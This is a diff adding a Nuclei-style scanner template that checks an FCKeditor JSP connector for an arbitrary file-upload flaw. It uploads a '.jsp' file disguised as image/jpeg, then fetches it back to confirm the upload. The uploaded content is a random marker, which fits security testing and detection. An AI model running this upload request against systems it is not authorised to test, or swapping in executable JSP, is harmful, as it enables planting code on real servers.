@@ -1,0 +1,42 @@
+id: dhyl-connector-anyfilepload
+
+info: 
+  name: dhyl-connector-anyfilepload
+  author: HB
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+  suijizifu: "{{to_lower(rand_base(12))}}"
+
+http:
+  - raw:
+    - |
+      POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Connection: close
+      Content-Length: 292
+
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Content-Disposition: form-data; name="NewFile"; filename="{{filename}}.jsp"
+      Content-Type: image/jpeg
+
+      {{suijizifu}}
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+      Content-Disposition: form-data; name="Submit"
+
+      upload
+      ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
+
+    - |
+      GET /common/FCKeditor/UserFiles/{{filename}}.jsp HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body_2,"{{suijizifu}}")
